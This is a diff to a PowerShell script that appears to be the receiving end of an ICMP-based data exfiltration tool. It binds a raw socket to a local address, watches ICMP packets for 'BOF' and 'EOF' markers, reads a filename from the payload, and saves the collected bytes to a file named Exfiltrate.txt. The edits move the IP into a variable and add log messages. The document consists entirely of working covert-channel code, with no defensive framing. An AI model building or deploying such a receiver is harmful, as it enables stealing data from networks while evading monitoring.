@@ -31,10 +31,11 @@
 # Use filename sent from Client script to save on server side
 
 $Outfile = "C:\temp\Exfiltrate.txt"
+$IP = "192.168.0.74"
 
 # Initialize socket and bind
 $ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
-$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse("192.168.0.74"), 0) 
+$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0) 
 $ICMPSocket.bind($Address)
 $ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
 $buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize
@@ -51,6 +52,7 @@ while($True)
             #IF EOF is received in data segment of ICMP the script will exit the loop.
             if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "EOF")
             {
+                Write-Output "EOF received - transfer complete - Saving file and stopping script"
                 #create file 
                 [System.Text.Encoding]::ASCII.GetString($Transferbytes) | Out-File $Outfile
                 $Capture = $false
@@ -67,6 +69,7 @@ while($True)
             if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "BOF")
             {
                 #BOF MATCH
+                Write-Output "BOF received - Starting Capture of file"
                 # Need to find a dynamic way to enumerate filename
                 $Filename = [System.Text.Encoding]::ASCII.GetString($buffer[31..46])
                 $Capture = $true       
